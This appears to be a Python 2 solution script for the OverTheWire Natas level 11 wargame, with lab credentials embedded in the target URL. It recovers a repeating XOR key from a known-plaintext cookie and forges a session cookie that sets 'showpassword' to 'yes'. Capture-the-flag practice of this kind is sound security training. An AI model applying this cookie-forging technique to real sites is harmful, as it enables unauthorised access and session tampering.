import requests,base64,json

target = 'http://natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK@natas11.natas.labs.overthewire.org'
data = 'ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw='
defaultData = {'showpassword':'no','bgcolor':'#ffffff'}

def xor_encrypt(input) :
	key = base64.b64decode(data)
	output = ''
	for i in range(len(input)) :
		output += chr(ord(input[i]) ^ ord(key[i%len(key)]))
	return output

originalKey = xor_encrypt(json.dumps(defaultData,separators=(',',':')))
print originalKey

originalKey = 'qw8J'
requiredData = {'showpassword':'yes','bgcolor':'#ffffff'}

def xor_encrypt_again(input) :
	key = originalKey
	output = ''
	for i in range(len(input)) :
		output += chr(ord(input[i]) ^ ord(key[i%len(key)]))
	return output

requiredCookie = base64.b64encode(xor_encrypt_again(json.dumps(requiredData,separators=(',',':'))))

cookie = {'data':requiredCookie}

r = requests.get(target,cookies=cookie)
if r.status_code != requests.codes.ok :
	print 'Unable to connect'
else :
	print 'Connected'

print r.text